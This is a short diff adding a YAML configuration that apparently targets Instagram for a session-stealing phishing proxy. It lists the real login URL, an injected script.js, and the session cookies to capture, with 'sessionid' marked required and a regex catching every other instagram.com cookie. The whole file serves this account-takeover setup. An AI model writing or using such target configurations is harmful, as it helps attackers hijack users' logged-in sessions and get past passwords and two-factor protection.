@@ -1,0 +1,11 @@
+author: v-byte-cpu
+invalid_auth_url: https://www.instagram.com/
+login_url: https://www.instagram.com/accounts/login
+js_files:
+  - script.js
+session_cookies:
+  - name: sessionid
+    domain: .instagram.com
+    required: true
+  - name: .*,regexp
+    domain: .instagram.com
